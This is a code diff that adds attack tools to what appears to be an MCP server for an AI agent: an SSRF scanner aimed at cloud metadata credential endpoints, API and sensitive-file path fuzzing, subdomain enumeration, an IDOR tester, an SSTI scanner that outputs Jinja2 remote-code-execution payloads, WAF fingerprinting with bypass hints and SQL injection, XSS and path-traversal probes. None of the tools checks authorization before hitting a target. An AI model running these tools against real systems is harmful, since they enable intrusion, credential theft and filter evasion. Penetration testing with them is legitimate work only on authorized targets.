+    log_tool_execution("jwt_analyzer", {"token": token[:30] + "..."}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def ssrf_scanner(
+    url: str,
+    param: str = "url",
+    payloads_mode: str = "standard"
+) -> str:
+    """
+    Test for Server-Side Request Forgery (SSRF) vulnerabilities.
+    Modes: standard, cloud_metadata, internal_network
+    """
+    result = {
+        "url": url,
+        "parameter": param,
+        "findings": [],
+        "tests_run": 0
+    }
+    
+    payloads = {
+        "standard": [
+            "http://127.0.0.1",
+            "http://localhost",
+            "http://[::1]",
+            "http://0.0.0.0",
+            "http://127.0.0.1:80",
+            "http://127.0.0.1:443",
+            "http://127.0.0.1:8080",
+            "http://127.0.0.1:3000",
+        ],
+        "cloud_metadata": [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://169.254.170.2/v2/credentials",
+            "http://100.100.100.200/latest/meta-data/",
+        ],
+        "internal_network": [
+            "http://192.168.1.1",
+            "http://10.0.0.1",
+            "http://172.16.0.1",
+            "http://192.168.0.1:8080",
+            "http://10.0.0.1:9200",  # Elasticsearch
+            "http://10.0.0.1:6379",  # Redis
+            "http://10.0.0.1:27017",  # MongoDB
+        ]
+    }
+    
+    test_payloads = payloads.get(payloads_mode, payloads["standard"])
+    
+    # Parse URL to inject parameter
+    parsed = urllib.parse.urlparse(url)
+    
+    for payload in test_payloads:
+        # Try as query parameter
+        if "?" in url:
+            test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
+        else:
+            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+        
+        cmd = run_command_advanced(
+            ["curl", "-sk", "--max-time", "10",
+             "-o", "/dev/null", "-w", "%{http_code}|%{time_total}|%{size_download}",
+             test_url],
+            timeout=15
+        )
+        
+        if cmd["success"] and cmd["stdout"]:
+            parts = cmd["stdout"].split('|')
+            if len(parts) >= 3:
+                status_code = parts[0]
+                response_time = float(parts[1]) if parts[1] else 0
+                response_size = int(parts[2]) if parts[2] else 0
+                
+                finding = {
+                    "payload": payload,
+                    "status_code": status_code,
+                    "response_time": response_time,
+                    "response_size": response_size,
+                    "suspicious": False
+                }
+                
+                # Check for SSRF indicators
+                if status_code == "200" and response_size > 0:
+                    finding["suspicious"] = True
+                    finding["reason"] = "Got 200 OK with content"
+                elif response_time > 3:
+                    finding["suspicious"] = True
+                    finding["reason"] = "Slow response suggests internal connection"
+                
+                if finding["suspicious"]:
+                    result["findings"].append(finding)
+                
+                result["tests_run"] += 1
+    
+    result["vulnerable"] = len(result["findings"]) > 0
+    
+    log_tool_execution("ssrf_scanner", {"url": url, "param": param}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def header_security_audit(
+    url: str
+) -> str:
+    """
+    Audit HTTP security headers for a target URL.
+    Checks: HSTS, CSP, X-Frame-Options, X-Content-Type-Options, 
+    Referrer-Policy, Permissions-Policy, CORS headers.
+    """
+    result = {
+        "url": url,
+        "grade": "F",
+        "score": 0,
+        "headers_present": {},
+        "headers_missing": [],
+        "findings": []
+    }
+    
+    cmd = run_command_advanced(
+        ["curl", "-sI", "-k", "--max-time", "10", url],
+        timeout=15
+    )
+    
+    if not cmd["success"]:
+        result["error"] = "Could not reach target"
+        return json.dumps(result, indent=2)
+    
+    # Parse headers
+    headers = {}
+    for line in cmd["stdout"].split('\n'):
+        if ':' in line and not line.startswith("HTTP"):
+            k, v = line.split(':', 1)
+            headers[k.strip().lower()] = v.strip()
+    
+    # Security header checks
+    checks = {
+        "strict-transport-security": {
+            "name": "HSTS",
+            "points": 15,
+            "description": "HTTP Strict Transport Security",
+            "recommendation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
+        },
+        "content-security-policy": {
+            "name": "CSP",
+            "points": 20,
+            "description": "Content Security Policy",
+            "recommendation": "Add: Content-Security-Policy: default-src 'self'"
+        },
+        "x-frame-options": {
+            "name": "X-Frame-Options",
+            "points": 10,
+            "description": "Clickjacking Protection",
+            "recommendation": "Add: X-Frame-Options: DENY"
+        },
+        "x-content-type-options": {
+            "name": "X-Content-Type-Options",
+            "points": 10,
+            "description": "MIME Sniffing Protection",
+            "recommendation": "Add: X-Content-Type-Options: nosniff"
+        },
+        "referrer-policy": {
+            "name": "Referrer-Policy",
+            "points": 10,
+            "description": "Referrer Information Control",
+            "recommendation": "Add: Referrer-Policy: strict-origin-when-cross-origin"
+        },
+        "permissions-policy": {
+            "name": "Permissions-Policy",
+            "points": 10,
+            "description": "Browser Feature Control",
+            "recommendation": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"
+        },
+        "x-xss-protection": {
+            "name": "X-XSS-Protection",
+            "points": 5,
+            "description": "XSS Filter (legacy)",
+            "recommendation": "Add: X-XSS-Protection: 1; mode=block"
+        }
+    }
+    
+    for header_key, check in checks.items():
+        if header_key in headers:
+            result["headers_present"][check["name"]] = headers[header_key]
+            result["score"] += check["points"]
+        else:
+            result["headers_missing"].append(check["name"])
+            result["findings"].append({
+                "header": check["name"],
+                "severity": "high" if check["points"] >= 15 else "medium",
+                "description": f"Missing {check['description']}",
+                "recommendation": check["recommendation"]
+            })
+    
+    # Check for information disclosure
+    info_headers = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]
+    for h in info_headers:
+        if h in headers:
+            result["findings"].append({
+                "header": h,
+                "severity": "low",
+                "description": f"Information disclosure: {h}: {headers[h]}",
+                "recommendation": f"Remove or obfuscate {h} header"
+            })
+    
+    # Grade
+    if result["score"] >= 70:
+        result["grade"] = "A"
+    elif result["score"] >= 55:
+        result["grade"] = "B"
+    elif result["score"] >= 40:
+        result["grade"] = "C"
+    elif result["score"] >= 25:
+        result["grade"] = "D"
+    else:
+        result["grade"] = "F"
+    
+    log_tool_execution("header_security_audit", {"url": url}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def api_endpoint_discovery(
+    base_url: str,
+    wordlist: str = "common",
+    methods: str = "GET,POST",
+    auth_header: Optional[str] = None,
+    timeout: int = 120
+) -> str:
+    """
+    Discover API endpoints by fuzzing common paths.
+    Wordlists: common, rest_api, graphql, fintech, crypto
+    """
+    result = {
+        "base_url": base_url,
+        "endpoints_found": [],
+        "total_tested": 0,
+        "interesting_codes": {}
+    }
+    
+    wordlists = {
+        "common": [
+            "api", "api/v1", "api/v2", "api/v3", "v1", "v2",
+            "health", "status", "version", "info", "docs", "swagger",
+            "openapi.json", "swagger.json", "api-docs", "graphql",
+            "admin", "dashboard", "config", "settings", "debug",
+            "users", "user", "auth", "login", "register", "token",
+            "oauth", "callback", "webhook", "websocket", "ws",
+            "metrics", "prometheus", "actuator", "env", "trace",
+            ".env", "robots.txt", "sitemap.xml", ".git/HEAD",
+            "wp-admin", "wp-login.php", "xmlrpc.php", "wp-json",
+        ],
+        "rest_api": [
+            "api/users", "api/user/me", "api/user/profile",
+            "api/accounts", "api/account", "api/orders", "api/order",
+            "api/products", "api/search", "api/upload", "api/download",
+            "api/export", "api/import", "api/report", "api/analytics",
+            "api/notifications", "api/messages", "api/payment",
+            "api/billing", "api/subscription", "api/invite",
+            "api/settings", "api/preferences", "api/admin",
+            "api/internal", "api/debug", "api/test", "api/health",
+        ],
+        "graphql": [
+            "graphql", "graphiql", "playground", "api/graphql",
+            "v1/graphql", "query", "gql", "graphql/console",
+        ],
+        "fintech": [
+            "api/v1/accounts", "api/v1/balance", "api/v1/transactions",
+            "api/v1/transfers", "api/v1/payments", "api/v1/portfolio",
+            "api/v1/positions", "api/v1/orders", "api/v1/quotes",
+            "api/v1/market", "api/v1/instruments", "api/v1/prices",
+            "api/v1/holdings", "api/v1/watchlist", "api/v1/trade",
+            "api/v1/user", "api/v1/kyc", "api/v1/2fa",
+            "api/v1/withdraw", "api/v1/deposit", "api/v1/history",
+            "internal/admin", "internal/debug", "internal/metrics",
+        ],
+        "crypto": [
+            "api/v1/wallet", "api/v1/swap", "api/v1/pool",
+            "api/v1/stake", "api/v1/farm", "api/v1/bridge",
+            "api/v1/nft", "api/v1/token", "api/v1/price",
+            "api/v1/chart", "api/v1/pairs", "api/v1/liquidity",
+            "api/v1/governance", "api/v1/proposal", "api/v1/vote",
+            "api/v1/airdrop", "api/v1/claim", "api/v1/vesting",
+            "api/v1/contract", "api/v1/abi",
+        ]
+    }
+    
+    paths = wordlists.get(wordlist, wordlist.split(',') if ',' in wordlist else wordlists["common"])
+    method_list = methods.split(',')
+    
+    base = base_url.rstrip('/')
+    
+    for path in paths:
+        for method in method_list:
+            curl_cmd = ["curl", "-sk", "--max-time", "5",
+                        "-o", "/dev/null",
+                        "-w", "%{http_code}|%{size_download}",
+                        "-X", method.strip()]
+            
+            if auth_header:
+                curl_cmd.extend(["-H", f"Authorization: {auth_header}"])
+            
+            curl_cmd.extend(["-H", "Content-Type: application/json"])
+            curl_cmd.append(f"{base}/{path}")
+            
+            cmd = run_command_advanced(curl_cmd, timeout=10)
+            
+            if cmd["success"] and cmd["stdout"]:
+                parts = cmd["stdout"].split('|')
+                code = parts[0] if parts else "0"
+                size = parts[1] if len(parts) > 1 else "0"
+                
+                if code not in ["000", "404", "0"]:
+                    endpoint = {
+                        "path": f"/{path}",
+                        "method": method.strip(),
+                        "status_code": code,
+                        "response_size": size
+                    }
+                    result["endpoints_found"].append(endpoint)
+                    
+                    code_key = f"HTTP_{code}"
+                    result["interesting_codes"][code_key] = result["interesting_codes"].get(code_key, 0) + 1
+            
+            result["total_tested"] += 1
+    
+    result["total_found"] = len(result["endpoints_found"])
+    
+    log_tool_execution("api_endpoint_discovery", {"base_url": base_url, "wordlist": wordlist}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def subdomain_scanner(
+    domain: str,
+    use_crtsh: bool = True,
+    use_bruteforce: bool = False,
+    timeout: int = 120
+) -> str:
+    """
+    Enumerate subdomains using multiple techniques:
+    - Certificate Transparency (crt.sh)
+    - DNS brute force (optional)
+    - subfinder if available
+    """
+    result = {
+        "domain": domain,
+        "subdomains": [],
+        "total": 0,
+        "sources": []
+    }
+    
+    all_subs = set()
+    
+    # 1. subfinder (if available)
+    sf_cmd = run_command_advanced(["subfinder", "-d", domain, "-silent", "-t", "20"], timeout=60)
+    if sf_cmd["success"] and sf_cmd["stdout"]:
+        subs = [s.strip() for s in sf_cmd["stdout"].split('\n') if s.strip()]
+        all_subs.update(subs)
+        result["sources"].append({"tool": "subfinder", "found": len(subs)})
+    
+    # 2. crt.sh (Certificate Transparency)
+    if use_crtsh:
+        crt_cmd = run_command_advanced(
+            ["curl", "-s", "--max-time", "20",
+             f"https://crt.sh/?q=%.{domain}&output=json"],
+            timeout=25
+        )
+        if crt_cmd["success"] and crt_cmd["stdout"]:
+            try:
+                certs = json.loads(crt_cmd["stdout"])
+                crt_subs = set()
+                for cert in certs:
+                    name = cert.get("name_value", "")
+                    for s in name.split('\n'):
+                        s = s.strip().lstrip('*.')
+                        if s.endswith(domain):
+                            crt_subs.add(s)
+                all_subs.update(crt_subs)
+                result["sources"].append({"tool": "crt.sh", "found": len(crt_subs)})
+            except json.JSONDecodeError:
+                pass
+    
+    # 3. DNS brute force
+    if use_bruteforce:
+        import socket
+        common_subs = [
+            "www", "mail", "ftp", "api", "dev", "staging", "test",
+            "admin", "portal", "vpn", "cdn", "static", "img",
+            "app", "beta", "demo", "docs", "git", "jenkins",
+            "jira", "confluence", "grafana", "kibana", "elastic",
+            "mongo", "redis", "db", "sql", "backup", "old",
+            "new", "v2", "internal", "intranet", "extranet"
+        ]
+        bruteforce_found = set()
+        for sub in common_subs:
+            fqdn = f"{sub}.{domain}"
+            try:
+                socket.getaddrinfo(fqdn, None)
+                bruteforce_found.add(fqdn)
+            except socket.gaierror:
+                continue
+        all_subs.update(bruteforce_found)
+        result["sources"].append({"tool": "dns_bruteforce", "found": len(bruteforce_found)})
+    
+    result["subdomains"] = sorted(list(all_subs))
+    result["total"] = len(all_subs)
+    
+    log_tool_execution("subdomain_scanner", {"domain": domain}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def idor_tester(
+    url: str,
+    param: str = "id",
+    start_id: int = 1,
+    end_id: int = 20,
+    auth_header: Optional[str] = None,
+    expected_code: int = 200
+) -> str:
+    """
+    Test for Insecure Direct Object Reference (IDOR) vulnerabilities
+    by iterating through sequential IDs and comparing responses.
+    """
+    result = {
+        "url": url,
+        "parameter": param,
+        "findings": [],
+        "tested_range": f"{start_id}-{end_id}",
+        "accessible_ids": []
+    }
+    
+    baseline_sizes = {}
+    
+    for i in range(start_id, end_id + 1):
+        test_url = url.replace(f"{{{param}}}", str(i))
+        if f"{{{param}}}" not in url:
+            if "?" in url:
+                test_url = f"{url}&{param}={i}"
+            else:
+                test_url = f"{url}?{param}={i}"
+        
+        curl_cmd = ["curl", "-sk", "--max-time", "5",
+                     "-o", "/dev/null",
+                     "-w", "%{http_code}|%{size_download}|%{time_total}"]
+        
+        if auth_header:
+            curl_cmd.extend(["-H", f"Authorization: {auth_header}"])
+        
+        curl_cmd.append(test_url)
+        
+        cmd = run_command_advanced(curl_cmd, timeout=10)
+        
+        if cmd["success"] and cmd["stdout"]:
+            parts = cmd["stdout"].split('|')
+            code = int(parts[0]) if parts[0].isdigit() else 0
+            size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
+            
+            if code == expected_code and size > 0:
+                result["accessible_ids"].append({
+                    "id": i,
+                    "status": code,
+                    "size": size,
+                    "url": test_url
+                })
+                baseline_sizes[size] = baseline_sizes.get(size, 0) + 1
+    
+    # Analyze: if different IDs return different sizes, likely IDOR
+    if len(baseline_sizes) > 1 and len(result["accessible_ids"]) > 1:
+        result["findings"].append({
+            "type": "potential_idor",
+            "severity": "high",
+            "description": f"Different response sizes for different IDs suggest IDOR. {len(result['accessible_ids'])} accessible objects found.",
+            "unique_response_sizes": len(baseline_sizes)
+        })
+    
+    result["vulnerable"] = len(result["findings"]) > 0
+    result["total_accessible"] = len(result["accessible_ids"])
+    
+    log_tool_execution("idor_tester", {"url": url, "param": param}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def ssti_scanner(
+    url: str,
+    param: str = "q",
+    method: str = "GET"
+) -> str:
+    """
+    Test for Server-Side Template Injection (SSTI) vulnerabilities.
+    Tests Jinja2, Twig, Freemarker, Smarty, Velocity, Pebble templates.
+    """
+    result = {
+        "url": url,
+        "parameter": param,
+        "vulnerable": False,
+        "engine_detected": None,
+        "findings": []
+    }
+    
+    # Ordered payloads to detect template engine
+    test_payloads = [
+        {"payload": "{{7*7}}", "expected": "49", "engine": "Jinja2/Twig"},
+        {"payload": "${7*7}", "expected": "49", "engine": "Freemarker/Velocity"},
+        {"payload": "<%= 7*7 %>", "expected": "49", "engine": "ERB/JSP"},
+        {"payload": "#{7*7}", "expected": "49", "engine": "Ruby/Java EL"},
+        {"payload": "*{7*7}", "expected": "49", "engine": "Thymeleaf"},
+        {"payload": "{{config}}", "expected": "Config", "engine": "Jinja2"},
+        {"payload": "${T(java.lang.Runtime)}", "expected": "Runtime", "engine": "Spring EL"},
+    ]
+    
+    for test in test_payloads:
+        encoded_payload = urllib.parse.quote(test["payload"])
+        
+        if method.upper() == "GET":
+            if "?" in url:
+                test_url = f"{url}&{param}={encoded_payload}"
+            else:
+                test_url = f"{url}?{param}={encoded_payload}"
+            curl_cmd = ["curl", "-sk", "--max-time", "10", test_url]
+        else:
+            curl_cmd = ["curl", "-sk", "--max-time", "10",
+                        "-X", "POST",
+                        "-d", f"{param}={encoded_payload}",
+                        url]
+        
+        cmd = run_command_advanced(curl_cmd, timeout=15)
+        
+        if cmd["success"] and cmd["stdout"]:
+            response = cmd["stdout"]
+            if test["expected"] in response and test["payload"] not in response:
+                result["vulnerable"] = True
+                result["engine_detected"] = test["engine"]
+                result["findings"].append({
+                    "payload": test["payload"],
+                    "expected": test["expected"],
+                    "engine": test["engine"],
+                    "severity": "critical",
+                    "description": f"SSTI confirmed with {test['engine']} engine"
+                })
+                break
+    
+    # If vulnerable, try RCE payloads
+    if result["vulnerable"] and "Jinja2" in (result["engine_detected"] or ""):
+        rce_payloads = [
+            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+            "{{lipsum.__globals__['os'].popen('whoami').read()}}",
+        ]
+        for rce in rce_payloads:
+            result["findings"].append({
+                "type": "rce_payload",
+                "severity": "critical",
+                "payload": rce,
+                "description": "Potential RCE payload for Jinja2"
+            })
+    
+    log_tool_execution("ssti_scanner", {"url": url, "param": param}, result)
+    return json.dumps(result, indent=2)
+
+
+@mcp.tool()
+async def run_curl_advanced(
+    url: str,
+    method: str = "GET",
+    headers: Optional[str] = None,
+    data: Optional[str] = None,
+    follow_redirects: bool = True,
+    show_headers: bool = True,
+    proxy: Optional[str] = None,
+    timeout: int = 30
+) -> str:
+    """
+    Advanced HTTP request tool with full control over method, headers, data, and options.
+    Headers format: 'Header1: Value1; Header2: Value2'
+    """
+    cmd = ["curl", "-sk", "--max-time", str(timeout)]
+    
+    if method.upper() != "GET":
+        cmd.extend(["-X", method.upper()])
+    
+    if follow_redirects:
+        cmd.append("-L")
+    
+    if show_headers:
+        cmd.append("-i")
+    
+    if headers:
+        for header in headers.split(';'):
+            header = header.strip()
+            if header:
+                cmd.extend(["-H", header])
+    
+    if data:
+        cmd.extend(["-d", data])
+    
+    if proxy:
+        cmd.extend(["--proxy", proxy])
+    
+    cmd.append(url)
+    
+    result_cmd = run_command_advanced(cmd, timeout=timeout + 5)
+    
+    output = {
+        "status": "success" if result_cmd["success"] else "error",
+        "url": url,
+        "method": method,
+        "execution_time": result_cmd["execution_time"],
+        "response": result_cmd["stdout"][:5000] if result_cmd["stdout"] else "",
+        "errors": result_cmd["stderr"] if result_cmd["stderr"] else None
+    }
+    
+    # Parse response code from response
+    if show_headers and result_cmd["stdout"]:
+        first_line = result_cmd["stdout"].split('\n')[0]
+        if "HTTP" in first_line:
+            parts = first_line.split()
+            if len(parts) >= 2:
+                output["response_code"] = parts[1]
+    
+    log_tool_execution("run_curl_advanced", {"url": url, "method": method}, output)
+    return json.dumps(output, indent=2)
+
+
+@mcp.tool()
+async def waf_fingerprint(
+    url: str,
+    aggressive: bool = False
+) -> str:
+    """
+    Detect and fingerprint Web Application Firewalls (WAF).
+    Tests: Cloudflare, AWS WAF, Akamai, Imperva, Sucuri, ModSecurity, F5 BIG-IP.
+    """
+    result = {
+        "url": url,
+        "waf_detected": False,
+        "waf_name": "none",
+        "confidence": 0,
+        "evidence": [],
+        "bypass_hints": []
+    }
+    
+    # 1. Check normal headers
+    normal_cmd = run_command_advanced(
+        ["curl", "-sI", "-k", "--max-time", "10", url],
+        timeout=15
+    )
+    
+    headers_text = normal_cmd["stdout"].lower() if normal_cmd["success"] else ""
+    
+    waf_signatures = {
+        "cloudflare": {
+            "headers": ["cf-ray", "cf-cache-status", "server: cloudflare"],
+            "bypass": ["Use origin IP if found", "Try different HTTP methods", "Encode payloads with Unicode"]
+        },
+        "aws_waf": {
+            "headers": ["x-amzn-", "x-amz-cf-", "server: amazons3"],
+            "bypass": ["Unicode normalization", "Header injection", "Case variation"]
+        },
+        "akamai": {
+            "headers": ["x-akamai", "akamai", "akamaighost"],
+            "bypass": ["HPP (HTTP Parameter Pollution)", "Chunked encoding"]
+        },
+        "imperva": {
+            "headers": ["x-iinfo", "incap_ses", "visid_incap"],
+            "bypass": ["Obfuscate via comments", "Double encoding"]
+        },
+        "sucuri": {
+            "headers": ["x-sucuri", "sucuri", "server: sucuri"],
+            "bypass": ["IP rotation", "Payload fragmentation"]
+        },
+        "modsecurity": {
+            "headers": ["server: apache", "mod_security"],
+            "bypass": ["Comment injection in SQL", "Concatenation tricks"]
+        },
+        "f5_bigip": {
+            "headers": ["x-wa-info", "bigipserver", "f5-"],
+            "bypass": ["HTTP desync", "Newline injection"]
+        }
+    }
+    
+    for waf_name, sig in waf_signatures.items():
+        for header_sig in sig["headers"]:
+            if header_sig in headers_text:
+                result["waf_detected"] = True
+                result["waf_name"] = waf_name
+                result["confidence"] = 90
+                result["evidence"].append(f"Header match: {header_sig}")
+                result["bypass_hints"] = sig["bypass"]
+                break
+        if result["waf_detected"]:
+            break
+    
+    # 2. Test with malicious payloads if aggressive
+    if aggressive:
+        test_payloads = [
+            "?id=1' OR '1'='1",
+            "?q=<script>alert(1)</script>",
+            "?file=../../../../etc/passwd",
+        ]
+        for payload in test_payloads:
+            test_url = url.rstrip('/') + payload
+            cmd = run_command_advanced(
+                ["curl", "-sk", "--max-time", "10",
+                 "-o", "/dev/null", "-w", "%{http_code}",
+                 test_url],
+                timeout=15
+            )
+            if cmd["success"]:
+                code = cmd["stdout"].strip()
+                if code in ["403", "406", "429", "503"]:
+                    result["waf_detected"] = True
+                    result["evidence"].append(f"Blocked response {code} for payload test")
+                    if result["confidence"] < 80:
+                        result["confidence"] = 80
+    
+    log_tool_execution("waf_fingerprint", {"url": url}, result)
+    return json.dumps(result, indent=2)
+
 
 # ============================================================================
 # MAIN ENTRY POINT
